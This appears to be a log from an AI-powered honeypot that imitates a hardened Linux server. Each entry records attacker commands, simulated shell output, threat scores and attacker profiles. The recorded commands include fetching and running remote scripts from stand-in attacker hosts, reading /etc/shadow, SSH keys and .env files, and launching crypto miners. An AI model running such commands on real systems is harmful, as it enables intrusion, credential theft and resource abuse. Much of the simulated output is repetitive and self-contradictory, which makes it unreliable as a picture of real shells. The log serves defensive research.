2026-07-21 11:16:25,738 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: xmrig -o pool.mine.org",
    "ai_decision": "[2023-02-20T14:30:00] AUDIT LOG: Command executed by root (uid=1001) on prod-restricted-01: xmrig -o pool.mine.org\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output:\n\nxmrig: error: unable to connect to pool.mine.org: Connection refused\n\n[2023-02-20T14:30:00] AUDIT LOG: Command completed with exit code 1\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/syslog\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/auth.log\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/xmrig.log",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:16:44,286 - {
    "session_id": "71dd20b2",
    "query": "minerd --url pool",
    "response": "minerd: error: invalid option -- 'u'\nminerd: usage: minerd [-h] [-v] [-V] [-c <config_file>]\nminerd:       [-o <mining_address>] [-O <mining_address>] [-u <url>]\nminerd:       [-p <password>] [-P <password>] [-t <threads>]\nminerd:       [-s <stratum_server>] [-S <stratum_server>]\nminerd:       [-w <wallet>] [-W <wallet>] [-a <algorithm>]\nminerd:       [-A <algorithm>] [-b <block_number>] [-B <block_number>]\nminerd:       [-r <retries>] [-R <retries>] [-d <debug_level>]\nminerd:       [-D <debug_level>] [-l <log_file>] [-L <log_file>]\nminerd:       [-m <mining_mode>] [-M <mining_mode>] [-n <net_type>]\nminerd:       [-N <net_type>] [-q <quiet>] [-Q <quiet>] [-h]\nminerd:       [-v] [-V]\nminerd:       [-h] [-v] [-V] [-c <config_file>]\nminerd:       [-o <mining_address>] [-O <mining_address>] [-u <url>]\nminerd:       [-p <password>] [-P <password>] [-t <threads>]\nminerd:       [-s <stratum_server>] [-S <stratum_server>]\nminerd:       [-w <wallet>] [-W <wallet>] [-a <algorithm>]\nminerd:       [-A <algorithm>] [-b <block_number>] [-B <block_number>]\nminerd:       [-r <retries>] [-R <retries>] [-d <debug_level>]\nminerd:       [-D <debug_level>] [-l <log_file>] [-L <log_file>]\nminerd:       [-m <mining_mode>] [-M <mining_mode>] [-n <net_type>]\nminerd:       [-N <net_type>] [-q <quiet>] [-Q <quiet>] [-h]\nminerd:       [-v] [-V]\nminerd: error: argument -u: expected one argument\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nmin",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 107,
        "risk_level": "CRITICAL",
        "final_score": 107,
        "threat_level": "CRITICAL",
        "base_score": 107,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 53,
            "unique_commands": 50,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 602,
            "commands_executed": 53,
            "successful_commands": 52,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 107,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:16:44,286 - {"session_id": "71dd20b2", "command": "minerd --url pool", "attack_type": "Unknown", "risk_score": 107, "threat_level": "CRITICAL"}
2026-07-21 11:16:44,286 - {
    "session_id": "71dd20b2",
    "command": "minerd --url pool",
    "ai_decision": "minerd: error: invalid option -- 'u'\nminerd: usage: minerd [-h] [-v] [-V] [-c <config_file>]\nminerd:       [-o <mining_address>] [-O <mining_address>] [-u <url>]\nminerd:       [-p <password>] [-P <password>] [-t <threads>]\nminerd:       [-s <stratum_server>] [-S <stratum_server>]\nminerd:       [-w <wallet>] [-W <wallet>] [-a <algorithm>]\nminerd:       [-A <algorithm>] [-b <block_number>] [-B <block_number>]\nminerd:       [-r <retries>] [-R <retries>] [-d <debug_level>]\nminerd:       [-D <debug_level>] [-l <log_file>] [-L <log_file>]\nminerd:       [-m <mining_mode>] [-M <mining_mode>] [-n <net_type>]\nminerd:       [-N <net_type>] [-q <quiet>] [-Q <quiet>] [-h]\nminerd:       [-v] [-V]\nminerd:       [-h] [-v] [-V] [-c <config_file>]\nminerd:       [-o <mining_address>] [-O <mining_address>] [-u <url>]\nminerd:       [-p <password>] [-P <password>] [-t <threads>]\nminerd:       [-s <stratum_server>] [-S <stratum_server>]\nminerd:       [-w <wallet>] [-W <wallet>] [-a <algorithm>]\nminerd:       [-A <algorithm>] [-b <block_number>] [-B <block_number>]\nminerd:       [-r <retries>] [-R <retries>] [-d <debug_level>]\nminerd:       [-D <debug_level>] [-l <log_file>] [-L <log_file>]\nminerd:       [-m <mining_mode>] [-M <mining_mode>] [-n <net_type>]\nminerd:       [-N <net_type>] [-q <quiet>] [-Q <quiet>] [-h]\nminerd:       [-v] [-V]\nminerd: error: argument -u: expected one argument\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nmin",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 53
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 107,
    "threat_level": "CRITICAL"
}
2026-07-21 11:16:44,286 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: minerd --url pool",
    "ai_decision": "minerd: error: invalid option -- 'u'\nminerd: usage: minerd [-h] [-v] [-V] [-c <config_file>]\nminerd:       [-o <mining_address>] [-O <mining_address>] [-u <url>]\nminerd:       [-p <password>] [-P <password>] [-t <threads>]\nminerd:       [-s <stratum_server>] [-S <stratum_server>]\nminerd:       [-w <wallet>] [-W <wallet>] [-a <algorithm>]\nminerd:       [-A <algorithm>] [-b <block_number>] [-B <block_number>]\nminerd:       [-r <retries>] [-R <retries>] [-d <debug_level>]\nminerd:       [-D <debug_level>] [-l <log_file>] [-L <log_file>]\nminerd:       [-m <mining_mode>] [-M <mining_mode>] [-n <net_type>]\nminerd:       [-N <net_type>] [-q <quiet>] [-Q <quiet>] [-h]\nminerd:       [-v] [-V]\nminerd:       [-h] [-v] [-V] [-c <config_file>]\nminerd:       [-o <mining_address>] [-O <mining_address>] [-u <url>]\nminerd:       [-p <password>] [-P <password>] [-t <threads>]\nminerd:       [-s <stratum_server>] [-S <stratum_server>]\nminerd:       [-w <wallet>] [-W <wallet>] [-a <algorithm>]\nminerd:       [-A <algorithm>] [-b <block_number>] [-B <block_number>]\nminerd:       [-r <retries>] [-R <retries>] [-d <debug_level>]\nminerd:       [-D <debug_level>] [-l <log_file>] [-L <log_file>]\nminerd:       [-m <mining_mode>] [-M <mining_mode>] [-n <net_type>]\nminerd:       [-N <net_type>] [-q <quiet>] [-Q <quiet>] [-h]\nminerd:       [-v] [-V]\nminerd: error: argument -u: expected one argument\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nminerd: error: argument -u: invalid value 'pool'\nmin",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:17:10,749 - {
    "session_id": "71dd20b2",
    "query": "./tmp/miner",
    "response": "-bash-5.1# ./tmp/miner\n-bash: ./tmp/miner: Permission denied\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 108,
        "risk_level": "CRITICAL",
        "final_score": 108,
        "threat_level": "CRITICAL",
        "base_score": 108,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 54,
            "unique_commands": 51,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 620,
            "commands_executed": 54,
            "successful_commands": 52,
            "failed_commands": 2,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 108,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:17:10,749 - {"session_id": "71dd20b2", "command": "./tmp/miner", "attack_type": "Unknown", "risk_score": 108, "threat_level": "CRITICAL"}
2026-07-21 11:17:10,749 - {
    "session_id": "71dd20b2",
    "command": "./tmp/miner",
    "ai_decision": "-bash-5.1# ./tmp/miner\n-bash: ./tmp/miner: Permission denied\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 54
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 108,
    "threat_level": "CRITICAL"
}
2026-07-21 11:17:10,749 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ./tmp/miner",
    "ai_decision": "-bash-5.1# ./tmp/miner\n-bash: ./tmp/miner: Permission denied\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14:30:00-04:00 prod-restricted-01 sshd[1234]: Failed password for root from 127.0.0.1 port 12345 ssh2\n-bash-5.1# tail -n 1 /var/log/secure\n2026-07-21T14",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:17:28,901 - {
    "session_id": "71dd20b2",
    "query": "base64 -d exploit.b64 > exploit",
    "response": "[Guardrail] Unsafe security request detected.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 109,
        "risk_level": "CRITICAL",
        "final_score": 109,
        "threat_level": "CRITICAL",
        "base_score": 109,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 55,
            "unique_commands": 52,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 647,
            "commands_executed": 55,
            "successful_commands": 53,
            "failed_commands": 2,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 109,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:17:28,901 - {"session_id": "71dd20b2", "command": "base64 -d exploit.b64 > exploit", "attack_type": "Unknown", "risk_score": 109, "threat_level": "CRITICAL"}
2026-07-21 11:17:28,901 - {
    "session_id": "71dd20b2",
    "command": "base64 -d exploit.b64 > exploit",
    "ai_decision": "[Guardrail] Unsafe security request detected.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 55
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 109,
    "threat_level": "CRITICAL"
}
2026-07-21 11:17:28,901 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: base64 -d exploit.b64 > exploit",
    "ai_decision": "[Guardrail] Unsafe security request detected.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:17:28,962 - {
    "session_id": "71dd20b2",
    "query": "find / -perm -4000 -type f 2>/dev/null",
    "response": "/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 113,
        "risk_level": "CRITICAL",
